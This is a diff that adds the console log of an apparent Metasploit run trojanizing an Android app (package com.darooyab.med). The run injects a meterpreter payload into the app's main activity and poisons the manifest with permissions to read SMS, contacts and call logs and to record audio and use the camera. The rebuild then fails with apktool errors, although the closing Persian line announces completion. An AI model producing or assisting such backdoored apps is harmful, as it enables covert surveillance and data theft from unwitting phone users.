@@ -1,0 +1,53 @@
+🚀 شروع تزریق پیلود...
+
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+/home/offsec/Documents/GitHub/metasploit-framework1/config/boot.rb:4: warning: already initialized constant GEMFILE_EXTENSIONS
+/usr/share/metasploit-framework/config/boot.rb:4: warning: previous definition of GEMFILE_EXTENSIONS was here
+Using APK template: /home/offsec/Downloads/MyPersonalOriginal.apk
+[*] Creating signing key and keystore..
+[*] Decompiling original APK..
+[*] Decompiling payload APK..
+[*] Locating hook point..
+[*] Adding payload as package com.darooyab.med.kmtzt
+[*] Loading /tmp/d20251122-5431-ed12xt/original/smali/com/darooyab/med/MainActivity.smali and injecting payload..
+[*] Poisoning the manifest with meterpreter permissions..
+[*] Adding <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+[*] Adding <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+[*] Adding <uses-permission android:name="android.permission.READ_CONTACTS"/>
+[*] Adding <uses-permission android:name="android.permission.CAMERA"/>
+[*] Adding <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+[*] Adding <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+[*] Adding <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+[*] Adding <uses-permission android:name="android.permission.SEND_SMS"/>
+[*] Adding <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+[*] Adding <uses-permission android:name="android.permission.CALL_PHONE"/>
+[*] Adding <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+[*] Adding <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+[*] Adding <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+[*] Adding <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+[*] Adding <uses-permission android:name="android.permission.READ_SMS"/>
+[*] Adding <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+[*] Adding <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+[*] Rebuilding apk with meterpreter injection as /tmp/d20251122-5431-ed12xt/output.apk
+[-] I: Using Apktool 2.9.3
+I: Checking whether sources has changed...
+I: Smaling smali folder into classes.dex...
+I: Checking whether sources has changed...
+I: Smaling smali_classes2 folder into classes2.dex...
+I: Checking whether resources has changed...
+I: Building resources...
+W: /tmp/d20251122-5431-ed12xt/original/AndroidManifest.xml:47: error: attribute android:enableOnBackInvokedCallback not found.
+W: error: failed processing manifest.
+brut.androlib.exceptions.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/tmp/brut_util_Jar_3504381742398053816797798426142455043.tmp, link, -o, /tmp/APKTOOL7200939563019306122.tmp, --package-id, 127, --min-sdk-version, 21, --target-sdk-version, 34, --version-code, 2104, --version-name, 1.5.4, --no-auto-version, --no-version-vectors, --no-version-transitions, --no-resource-deduping, --allow-reserved-package-id, --no-compile-sdk-metadata, --warn-manifest-validation, -e, /tmp/APKTOOL4656936966030106742.tmp, -0, arsc, -I, /home/offsec/.local/share/apktool/framework/1.apk, --manifest, /tmp/d20251122-5431-ed12xt/original/AndroidManifest.xml, /tmp/d20251122-5431-ed12xt/original/build/resources.zip]
+[*] Unable to rebuild apk. Trying rebuild with AAPT2..
+[-] I: Using Apktool 2.9.3
+I: Checking whether sources has changed...
+I: Checking whether sources has changed...
+I: Checking whether resources has changed...
+I: Building resources...
+W: /tmp/d20251122-5431-ed12xt/original/AndroidManifest.xml:47: error: attribute android:enableOnBackInvokedCallback not found.
+W: error: failed processing manifest.
+brut.androlib.exceptions.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/tmp/brut_util_Jar_122244896633705359738210605640872214999.tmp, link, -o, /tmp/APKTOOL9043849163035816502.tmp, --package-id, 127, --min-sdk-version, 21, --target-sdk-version, 34, --version-code, 2104, --version-name, 1.5.4, --no-auto-version, --no-version-vectors, --no-version-transitions, --no-resource-deduping, --allow-reserved-package-id, --no-compile-sdk-metadata, --warn-manifest-validation, -e, /tmp/APKTOOL14254820032950513444.tmp, -0, arsc, -I, /home/offsec/.local/share/apktool/framework/1.apk, --manifest, /tmp/d20251122-5431-ed12xt/original/AndroidManifest.xml, /tmp/d20251122-5431-ed12xt/original/build/resources.zip]
+Error: Unable to rebuild apk with apktool
+
+✅ عملیات تکمیل شد
